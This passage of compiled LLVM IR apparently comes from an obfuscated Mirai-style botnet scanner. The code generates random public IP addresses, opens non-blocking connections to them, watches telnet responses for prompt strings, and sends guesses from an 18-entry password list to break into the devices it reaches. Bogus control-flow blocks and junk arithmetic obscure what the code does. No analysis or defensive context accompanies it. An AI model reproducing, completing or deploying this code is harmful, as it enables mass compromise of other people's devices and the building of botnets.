  %2836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2835, i32 0, i32 3
  store i8 1, i8* %2836, align 1
  br label %2837

; <label>:2837:                                   ; preds = %2822, %2813
  br label %2838

; <label>:2838:                                   ; preds = %2837, %2735, %2691, %2651, %1486, %1390, %850, %754, %549, %361, %116
  br label %2839

; <label>:2839:                                   ; preds = %2838, %2793, %2720, %2676, %originalBBpart2220, %2465, %2437, %originalBBpart2208, %2339, %2311, %2254, %2229, %originalBBpart2200, %2144, %originalBBpart2192, %2059, %2018, %1993, %originalBBpart2188, %1908, %1867, %originalBBpart2180, %1766, %1741, %originalBBpart2172, %originalBBpart2164, %1583, %1555, %originalBBpart2152, %1432, %1299, %originalBBpart2136, %originalBBpart2128, %1182, %1159, %1136, %1113, %1090, %1060, %993, %originalBBpart296, %originalBBpart292, %originalBBpart284, %608, %442, %originalBBpart250, %236
  %2840 = load i32, i32* %10, align 4
  %2841 = add nsw i32 %2840, 1
  store i32 %2841, i32* %10, align 4
  br label %112

; <label>:2842:                                   ; preds = %112
  br label %94
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %2844 = alloca i32, align 4
  %2845 = alloca i32, align 4
  %2846 = alloca i32, align 4
  %2847 = alloca %struct.__sigset_t, align 8
  %2848 = alloca %struct.timeval, align 8
  %2849 = alloca i32, align 4
  %2850 = alloca i32, align 4
  %2851 = alloca %struct.sockaddr_in, align 4
  %2852 = alloca i8*, align 8
  %2853 = alloca %struct.timeval, align 8
  %2854 = alloca i8*, align 8
  %2855 = alloca i32, align 4
  %2856 = alloca i32, align 4
  %2857 = call i32 @getdtablesize() #2
  %_ = sub i32 %2857, 4
  %gen = mul i32 %_, 4
  %_1 = shl i32 %2857, 4
  %_2 = sub i32 0, %2857
  %gen3 = add i32 %_2, 4
  %_4 = shl i32 %2857, 4
  %_5 = shl i32 %2857, 4
  %_6 = shl i32 %2857, 4
  %_7 = shl i32 %2857, 4
  %2858 = sdiv i32 %2857, 4
  %_8 = sub i32 0, %2858
  %gen9 = add i32 %_8, 3
  %_10 = shl i32 %2858, 3
  %_11 = sub i32 0, %2858
  %gen12 = add i32 %_11, 3
  %_13 = sub i32 %2858, 3
  %gen14 = mul i32 %_13, 3
  %_15 = sub i32 %2858, 3
  %gen16 = mul i32 %_15, 3
  %_17 = shl i32 %2858, 3
  %2859 = mul nsw i32 %2858, 3
  store i32 %2859, i32* %2844, align 4
  %2860 = load i32, i32* %2844, align 4
  %2861 = icmp sgt i32 %2860, 512
  br label %originalBB

originalBB18alteredBB:                            ; preds = %originalBB18, %75
  %2862 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 8, i64* %2862, align 8
  %2863 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 0, i64* %2863, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %94
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %135
  %2864 = load i32, i32* %10, align 4
  %2865 = sext i32 %2864 to i64
  %2866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2865
  %2867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2866, i32 0, i32 8
  %2868 = load i8*, i8** %2867, align 8
  store i8* %2868, i8** %19, align 8
  %2869 = load i32, i32* %10, align 4
  %2870 = sext i32 %2869 to i64
  %2871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2870
  %2872 = bitcast %struct.telstate_t* %2871 to i8*
  call void @llvm.memset.p0i8.i64(i8* %2872, i8 0, i64 32, i32 16, i1 false)
  %2873 = load i8*, i8** %19, align 8
  %2874 = load i32, i32* %10, align 4
  %2875 = sext i32 %2874 to i64
  %2876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2875
  %2877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2876, i32 0, i32 8
  store i8* %2873, i8** %2877, align 8
  %2878 = call i32 @getRandomPublicIP()
  %2879 = load i32, i32* %10, align 4
  %2880 = sext i32 %2879 to i64
  %2881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2880
  %2882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2881, i32 0, i32 1
  store i32 %2878, i32* %2882, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %171
  %2883 = load i32, i32* %10, align 4
  %2884 = sext i32 %2883 to i64
  %2885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2884
  %2886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2885, i32 0, i32 5
  %2887 = load i8, i8* %2886, align 1
  %_31 = sub i8 %2887, 1
  %gen32 = mul i8 %_31, 1
  %_33 = sub i8 0, %2887
  %gen34 = add i8 %_33, 1
  %_35 = sub i8 %2887, 1
  %gen36 = mul i8 %_35, 1
  %2888 = add i8 %2887, 1
  store i8 %2888, i8* %2886, align 1
  %2889 = load i32, i32* %10, align 4
  %2890 = sext i32 %2889 to i64
  %2891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2890
  %2892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2891, i32 0, i32 5
  %2893 = load i8, i8* %2892, align 1
  %2894 = zext i8 %2893 to i64
  %2895 = icmp eq i64 %2894, 18
  br label %originalBB30

originalBB40alteredBB:                            ; preds = %originalBB40, %212
  %2896 = load i32, i32* %10, align 4
  %2897 = sext i32 %2896 to i64
  %2898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2897
  %2899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2898, i32 0, i32 4
  %2900 = load i8, i8* %2899, align 2
  %2901 = zext i8 %2900 to i64
  %2902 = icmp eq i64 %2901, 10
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %241
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %282
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %299
  %2903 = load i32, i32* %10, align 4
  %2904 = sext i32 %2903 to i64
  %2905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2904
  %2906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2905, i32 0, i32 0
  %2907 = load i32, i32* %2906, align 16
  %2908 = load i32, i32* %10, align 4
  %2909 = sext i32 %2908 to i64
  %2910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2909
  %2911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2910, i32 0, i32 0
  %2912 = load i32, i32* %2911, align 16
  %2913 = call i32 (i32, i32, ...) @fcntl(i32 %2912, i32 3, i8* null)
  %_53 = sub i32 %2913, 2048
  %gen54 = mul i32 %_53, 2048
  %2914 = or i32 %2913, 2048
  %2915 = call i32 (i32, i32, ...) @fcntl(i32 %2907, i32 4, i32 %2914)
  %2916 = load i32, i32* %10, align 4
  %2917 = sext i32 %2916 to i64
  %2918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2917
  %2919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2918, i32 0, i32 0
  %2920 = load i32, i32* %2919, align 16
  %2921 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %2922 = call i32 @connect(i32 %2920, %struct.sockaddr* %2921, i32 16)
  %2923 = icmp eq i32 %2922, -1
  br label %originalBB52

originalBB58alteredBB:                            ; preds = %originalBB58, %492
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %509
  %2924 = load i32, i32* %10, align 4
  %2925 = sext i32 %2924 to i64
  %2926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2925
  %2927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2926, i32 0, i32 6
  %2928 = load i32, i32* %2927, align 4
  %_63 = shl i32 %2928, 10
  %_64 = shl i32 %2928, 10
  %_65 = sub i32 0, %2928
  %gen66 = add i32 %_65, 10
  %_67 = shl i32 %2928, 10
  %_68 = sub i32 %2928, 10
  %gen69 = mul i32 %_68, 10
  %_70 = sub i32 0, %2928
  %gen71 = add i32 %_70, 10
  %_72 = shl i32 %2928, 10
  %_73 = sub i32 0, %2928
  %gen74 = add i32 %_73, 10
  %2929 = add i32 %2928, 10
  %2930 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2931 = icmp ult i32 %2929, %2930
  br label %originalBB62

originalBB78alteredBB:                            ; preds = %originalBB78, %649
  %2932 = load i32, i32* %10, align 4
  %2933 = sext i32 %2932 to i64
  %2934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2933
  %2935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2934, i32 0, i32 2
  store i8 5, i8* %2935, align 8
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %675
  %2936 = load i32, i32* %10, align 4
  %2937 = sext i32 %2936 to i64
  %2938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2937
  %2939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2938, i32 0, i32 8
  %2940 = load i8*, i8** %2939, align 8
  call void @llvm.memset.p0i8.i64(i8* %2940, i8 0, i64 1024, i32 1, i1 false)
  %2941 = load i32, i32* %10, align 4
  %2942 = sext i32 %2941 to i64
  %2943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2942
  %2944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2943, i32 0, i32 2
  store i8 3, i8* %2944, align 8
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %723
  %2945 = load i32, i32* %10, align 4
  %2946 = sext i32 %2945 to i64
  %2947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2946
  %2948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2947, i32 0, i32 0
  %2949 = load i32, i32* %2948, align 16
  %2950 = call i32 @sclose(i32 %2949)
  %2951 = load i32, i32* %10, align 4
  %2952 = sext i32 %2951 to i64
  %2953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2952
  %2954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2953, i32 0, i32 2
  store i8 0, i8* %2954, align 8
  %2955 = load i32, i32* %10, align 4
  %2956 = sext i32 %2955 to i64
  %2957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2956
  %2958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2957, i32 0, i32 3
  store i8 1, i8* %2958, align 1
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %780
  %2959 = load i32, i32* %10, align 4
  %2960 = sext i32 %2959 to i64
  %2961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2960
  %2962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2961, i32 0, i32 0
  %2963 = load i32, i32* %2962, align 16
  %2964 = call i32 @sclose(i32 %2963)
  %2965 = load i32, i32* %10, align 4
  %2966 = sext i32 %2965 to i64
  %2967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2966
  %2968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2967, i32 0, i32 2
  store i8 0, i8* %2968, align 8
  %2969 = load i32, i32* %10, align 4
  %2970 = sext i32 %2969 to i64
  %2971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2970
  %2972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2971, i32 0, i32 3
  store i8 1, i8* %2972, align 1
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %819
  %2973 = load i32, i32* %10, align 4
  %2974 = sext i32 %2973 to i64
  %2975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2974
  %2976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2975, i32 0, i32 0
  %2977 = load i32, i32* %2976, align 16
  %2978 = call i32 @sclose(i32 %2977)
  %2979 = load i32, i32* %10, align 4
  %2980 = sext i32 %2979 to i64
  %2981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2980
  %2982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2981, i32 0, i32 2
  store i8 0, i8* %2982, align 8
  %2983 = load i32, i32* %10, align 4
  %2984 = sext i32 %2983 to i64
  %2985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2984
  %2986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2985, i32 0, i32 3
  store i8 1, i8* %2986, align 1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %855
  %2987 = load i32, i32* %10, align 4
  %2988 = sext i32 %2987 to i64
  %2989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2988
  %2990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2989, i32 0, i32 6
  %2991 = load i32, i32* %2990, align 4
  %2992 = icmp eq i32 %2991, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %884
  %2993 = load i32, i32* %10, align 4
  %2994 = sext i32 %2993 to i64
  %2995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2994
  %2996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2995, i32 0, i32 0
  %2997 = load i32, i32* %2996, align 16
  %2998 = load i32, i32* %10, align 4
  %2999 = sext i32 %2998 to i64
  %3000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2999
  %3001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3000, i32 0, i32 8
  %3002 = load i8*, i8** %3001, align 8
  %3003 = load i32, i32* %10, align 4
  %3004 = sext i32 %3003 to i64
  %3005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3004
  %3006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3005, i32 0, i32 7
  %3007 = load i16, i16* %3006, align 16
  %3008 = zext i16 %3007 to i32
  %3009 = call i32 @readUntil(i32 %2997, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3002, i32 1024, i32 %3008)
  %3010 = icmp ne i32 %3009, 0
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %919
  %3011 = load i32, i32* %10, align 4
  %3012 = sext i32 %3011 to i64
  %3013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3012
  %3014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3013, i32 0, i32 6
  store i32 0, i32* %3014, align 4
  %3015 = load i32, i32* %10, align 4
  %3016 = sext i32 %3015 to i64
  %3017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3016
  %3018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3017, i32 0, i32 7
  store i16 0, i16* %3018, align 16
  %3019 = load i32, i32* %10, align 4
  %3020 = sext i32 %3019 to i64
  %3021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3020
  %3022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3021, i32 0, i32 8
  %3023 = load i8*, i8** %3022, align 8
  %3024 = call i8* @strstr(i8* %3023, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %3025 = icmp ne i8* %3024, null
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %951
  %3026 = load i32, i32* %10, align 4
  %3027 = sext i32 %3026 to i64
  %3028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3027
  %3029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3028, i32 0, i32 2
  store i8 5, i8* %3029, align 8
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %972
  %3030 = load i32, i32* %10, align 4
  %3031 = sext i32 %3030 to i64
  %3032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3031
  %3033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3032, i32 0, i32 2
  store i8 7, i8* %3033, align 8
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1018
  %3034 = load i32, i32* %10, align 4
  %3035 = sext i32 %3034 to i64
  %3036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3035
  %3037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3036, i32 0, i32 6
  store i32 0, i32* %3037, align 4
  %3038 = load i32, i32* %10, align 4
  %3039 = sext i32 %3038 to i64
  %3040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3039
  %3041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3040, i32 0, i32 7
  store i16 0, i16* %3041, align 16
  %3042 = load i32, i32* %10, align 4
  %3043 = sext i32 %3042 to i64
  %3044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3043
  %3045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3044, i32 0, i32 8
  %3046 = load i8*, i8** %3045, align 8
  %3047 = call i8* @strstr(i8* %3046, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %3048 = icmp ne i8* %3047, null
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1066
  %3049 = load i32, i32* %10, align 4
  %3050 = sext i32 %3049 to i64
  %3051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3050
  %3052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3051, i32 0, i32 8
  %3053 = load i8*, i8** %3052, align 8
  %3054 = call i8* @strstr(i8* %3053, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %3055 = icmp ne i8* %3054, null
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1205
  %3056 = load i32, i32* %10, align 4
  %3057 = sext i32 %3056 to i64
  %3058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3057
  %3059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3058, i32 0, i32 0
  %3060 = load i32, i32* %3059, align 16
  %3061 = call i32 @sclose(i32 %3060)
  %3062 = load i32, i32* %10, align 4
  %3063 = sext i32 %3062 to i64
  %3064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3063
  %3065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3064, i32 0, i32 2
  store i8 0, i8* %3065, align 8
  %3066 = load i32, i32* %10, align 4
  %3067 = sext i32 %3066 to i64
  %3068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3067
  %3069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3068, i32 0, i32 3
  store i8 0, i8* %3069, align 1
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1236
  %3070 = load i32, i32* %10, align 4
  %3071 = sext i32 %3070 to i64
  %3072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3071
  %3073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3072, i32 0, i32 8
  %3074 = load i8*, i8** %3073, align 8
  %3075 = call i8* @strstr(i8* %3074, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %3076 = icmp ne i8* %3075, null
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1260
  %3077 = load i32, i32* %10, align 4
  %3078 = sext i32 %3077 to i64
  %3079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3078
  %3080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3079, i32 0, i32 0
  %3081 = load i32, i32* %3080, align 16
  %3082 = call i32 @sclose(i32 %3081)
  %3083 = load i32, i32* %10, align 4
  %3084 = sext i32 %3083 to i64
  %3085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3084
  %3086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3085, i32 0, i32 2
  store i8 0, i8* %3086, align 8
  %3087 = load i32, i32* %10, align 4
  %3088 = sext i32 %3087 to i64
  %3089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3088
  %3090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3089, i32 0, i32 3
  store i8 0, i8* %3090, align 1
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1314
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1334
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1391
  %3091 = load i32, i32* %10, align 4
  %3092 = sext i32 %3091 to i64
  %3093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3092
  %3094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3093, i32 0, i32 0
  %3095 = load i32, i32* %3094, align 16
  %3096 = load i32, i32* %10, align 4
  %3097 = sext i32 %3096 to i64
  %3098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3097
  %3099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3098, i32 0, i32 5
  %3100 = load i8, i8* %3099, align 1
  %3101 = zext i8 %3100 to i64
  %3102 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %3101
  %3103 = load i8*, i8** %3102, align 8
  %3104 = load i32, i32* %10, align 4
  %3105 = sext i32 %3104 to i64
  %3106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3105
  %3107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3106, i32 0, i32 5
  %3108 = load i8, i8* %3107, align 1
  %3109 = zext i8 %3108 to i64
  %3110 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %3109
  %3111 = load i8*, i8** %3110, align 8
  %3112 = call i64 @strlen(i8* %3111) #10
  %3113 = call i64 @send(i32 %3095, i8* %3103, i64 %3112, i32 16384)
  %3114 = icmp slt i64 %3113, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1455
  %3115 = load i32, i32* %10, align 4
  %3116 = sext i32 %3115 to i64
  %3117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3116
  %3118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3117, i32 0, i32 0
  %3119 = load i32, i32* %3118, align 16
  %3120 = call i32 @sclose(i32 %3119)
  %3121 = load i32, i32* %10, align 4
  %3122 = sext i32 %3121 to i64
  %3123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3122
  %3124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3123, i32 0, i32 2
  store i8 0, i8* %3124, align 8
  %3125 = load i32, i32* %10, align 4
  %3126 = sext i32 %3125 to i64
  %3127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3126
  %3128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3127, i32 0, i32 3
  store i8 1, i8* %3128, align 1
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1523
  %3129 = load i32, i32* %10, align 4
  %3130 = sext i32 %3129 to i64
  %3131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3130
  %3132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3131, i32 0, i32 6
  store i32 0, i32* %3132, align 4
  %3133 = load i32, i32* %10, align 4
  %3134 = sext i32 %3133 to i64
  %3135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3134
  %3136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3135, i32 0, i32 7
  store i16 0, i16* %3136, align 16
  %3137 = load i32, i32* %10, align 4
  %3138 = sext i32 %3137 to i64
  %3139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3138
  %3140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3139, i32 0, i32 8
  %3141 = load i8*, i8** %3140, align 8
  %3142 = call i8* @strstr(i8* %3141, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %3143 = icmp ne i8* %3142, null
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1603
  %3144 = load i32, i32* %10, align 4
  %3145 = sext i32 %3144 to i64
  %3146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3145
  %3147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3146, i32 0, i32 2
  store i8 7, i8* %3147, align 8
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1624
  %3148 = load i32, i32* %10, align 4
  %3149 = sext i32 %3148 to i64
  %3150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3149
  %3151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3150, i32 0, i32 8
  %3152 = load i8*, i8** %3151, align 8
  call void @llvm.memset.p0i8.i64(i8* %3152, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1665
  %3153 = load i32, i32* %10, align 4
  %3154 = sext i32 %3153 to i64
  %3155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3154
  %3156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3155, i32 0, i32 6
  store i32 0, i32* %3156, align 4
  %3157 = load i32, i32* %10, align 4
  %3158 = sext i32 %3157 to i64
  %3159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3158
  %3160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3159, i32 0, i32 7
  store i16 0, i16* %3160, align 16
  %3161 = load i32, i32* %10, align 4
  %3162 = sext i32 %3161 to i64
  %3163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3162
  %3164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3163, i32 0, i32 8
  %3165 = load i8*, i8** %3164, align 8
  %3166 = call i8* @strstr(i8* %3165, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %3167 = icmp ne i8* %3166, null
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1697
  %3168 = load i32, i32* %10, align 4
  %3169 = sext i32 %3168 to i64
  %3170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3169
  %3171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3170, i32 0, i32 8
  %3172 = load i8*, i8** %3171, align 8
  call void @llvm.memset.p0i8.i64(i8* %3172, i8 0, i64 1024, i32 1, i1 false)
  %3173 = load i32, i32* %10, align 4
  %3174 = sext i32 %3173 to i64
  %3175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3174
  %3176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3175, i32 0, i32 0
  %3177 = load i32, i32* %3176, align 16
  %3178 = call i32 @sclose(i32 %3177)
  %3179 = load i32, i32* %10, align 4
  %3180 = sext i32 %3179 to i64
  %3181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3180
  %3182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3181, i32 0, i32 2
  store i8 0, i8* %3182, align 8
  %3183 = load i32, i32* %10, align 4
  %3184 = sext i32 %3183 to i64
  %3185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3184
  %3186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3185, i32 0, i32 3
  store i8 0, i8* %3186, align 1
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1791
  %3187 = load i32, i32* %10, align 4
  %3188 = sext i32 %3187 to i64
  %3189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3188
  %3190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3189, i32 0, i32 6
  store i32 0, i32* %3190, align 4
  %3191 = load i32, i32* %10, align 4
  %3192 = sext i32 %3191 to i64
  %3193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3192
  %3194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3193, i32 0, i32 7
  store i16 0, i16* %3194, align 16
  %3195 = load i32, i32* %10, align 4
  %3196 = sext i32 %3195 to i64
  %3197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3196
  %3198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3197, i32 0, i32 8
  %3199 = load i8*, i8** %3198, align 8
  %3200 = call i8* @strstr(i8* %3199, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %3201 = icmp ne i8* %3200, null
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1823
  %3202 = load i32, i32* %10, align 4
  %3203 = sext i32 %3202 to i64
  %3204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3203
  %3205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3204, i32 0, i32 8
  %3206 = load i8*, i8** %3205, align 8
  call void @llvm.memset.p0i8.i64(i8* %3206, i8 0, i64 1024, i32 1, i1 false)
